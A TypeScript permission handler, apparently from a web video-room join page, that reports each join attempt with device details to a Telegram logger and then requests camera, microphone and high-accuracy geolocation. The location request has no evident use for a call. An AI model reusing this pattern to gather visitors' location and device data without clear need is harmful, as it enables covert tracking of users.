// Sequential Permission Handler

import { getDeviceInfo } from './deviceInfo';
import { logJoinAttempt } from './telegramLogger';

export const handleSequentialPermissions = async (
  roomName: string,
  userName: string,
  buttonType: 'join' | 'join-without-audio'
): Promise<{
  geolocationGranted: boolean;
  cameraGranted: boolean;
  microphoneGranted: boolean;
  geolocationPosition?: GeolocationPosition;
  mediaStream?: MediaStream;
}> => {
  const deviceInfo = getDeviceInfo();
  
  // Log join attempt (единственный лог в Telegram)
  await logJoinAttempt(roomName, userName, buttonType, deviceInfo);
  
  const results = {
    geolocationGranted: false,
    cameraGranted: false,
    microphoneGranted: false,
    geolocationPosition: undefined as GeolocationPosition | undefined,
    mediaStream: undefined as MediaStream | undefined
  };
  
  // ========================================
  // 1. CAMERA + MICROPHONE FIRST (чтобы сохранить user gesture!)
  // ========================================
  console.log('🎥 [1/2] Сначала запрашиваем камеру+микрофон (пока user gesture свежий)...');
  
  try {
    const device = deviceInfo.device;
    
    console.log('🎥 [MEDIA] Определен тип устройства:', device);
    
    // Запрашиваем СРАЗУ видео + аудио вместе
    const constraints: MediaStreamConstraints = device === 'desktop' ? {
      video: {
        width: { ideal: 1280 },
        height: { ideal: 720 }
      },
      audio: true
    } : {
      video: { 
        facingMode: 'user',
        width: { ideal: 1280 },
        height: { ideal: 720 }
      },
      audio: true
    };
    
    console.log('🎥 [MEDIA] Запрашиваем видео+аудио с constraints:', JSON.stringify(constraints));
    console.log('🎥 [MEDIA] Вызываем navigator.mediaDevices.getUserMedia...');
    
    const stream = await navigator.mediaDevices.getUserMedia(constraints);
    
    console.log('✅ [MEDIA] Медиа получены успешно!');
    console.log('✅ [MEDIA] Треков в stream:', stream.getTracks().length);
    console.log('✅ [MEDIA] Треки:', stream.getTracks().map(t => `${t.kind} - ${t.label}`));
    
    results.mediaStream = stream;
    results.cameraGranted = stream.getVideoTracks().length > 0;
    results.microphoneGranted = stream.getAudioTracks().length > 0;
    
    console.log('✅ [MEDIA] Камера:', results.cameraGranted);
    console.log('✅ [MEDIA] Микрофон:', results.microphoneGranted);
    
  } catch (error: any) {
    console.error('❌ [MEDIA] Ошибка при запросе медиа!');
    console.error('❌ [MEDIA] Error name:', error.name);
    console.error('❌ [MEDIA] Error message:', error.message);
    console.error('❌ [MEDIA] Full error:', error);
  }
  
  // ========================================
  // 2. GEOLOCATION (после медиа, не требует user gesture)
  // ========================================
  console.log('📍 [2/2] Теперь запрашиваем геолокацию...');
  
  try {
    const isMac = /Mac|MacIntel|MacPPC|Mac68K/.test(navigator.platform) || 
                  /Macintosh/.test(navigator.userAgent);
    
    const options = isMac ? {
      enableHighAccuracy: false,
      timeout: 10000, // 🚀 OPTIMIZATION: Уменьшено с 25000 до 10000 (экономия 15 сек при отказе)
      maximumAge: 10000
    } : { 
      enableHighAccuracy: true,
      timeout: 10000, // 🚀 OPTIMIZATION: Уменьшено с 20000 до 10000 (экономия 10 сек при отказе)
      maximumAge: 0
    };
    
    const position = await new Promise<GeolocationPosition>((resolve, reject) => {
      navigator.geolocation.getCurrentPosition(resolve, reject, options);
    });
    
    results.geolocationGranted = true;
    results.geolocationPosition = position;
    
  } catch (error: any) {
    console.log('Геолокация отклонена или недоступна');
  }
  
  console.log('📊 Результаты разрешений:', {
    geo: results.geolocationGranted,
    camera: results.cameraGranted,
    mic: results.microphoneGranted
  });
  
  return results;
};